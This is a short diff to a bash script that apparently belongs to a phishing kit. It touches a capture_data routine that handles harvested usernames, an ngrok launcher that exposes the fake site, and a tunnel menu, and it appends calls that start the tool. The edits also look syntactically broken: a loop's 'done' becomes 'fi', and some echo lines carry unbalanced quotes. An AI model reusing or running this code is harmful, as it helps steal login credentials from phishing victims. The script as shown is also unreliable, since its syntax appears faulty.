@@ -169,14 +169,15 @@ capture_data() {
 			rm -rf .server/www/usernames.txt
 		fi
 		sleep 0.75
-	done
+fi
 }
 
 ## Start ngrok
 start_ngrok() {
 	echo -e $red STARING WAIT.......http://$HOST:$PORT 
-	{ sleep 1; setup_site; }
-	echo -e NGROK LAUNCH....."
+	 sleep 1
+        setup_site
+	echo -e $red NGROK LAUNCH....."
 
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 
@@ -219,3 +220,7 @@ tunnel_menu() {
                 tunnel_menu 
 	fi
 }
+
+dependencies
+ngrok_server
+main_menu
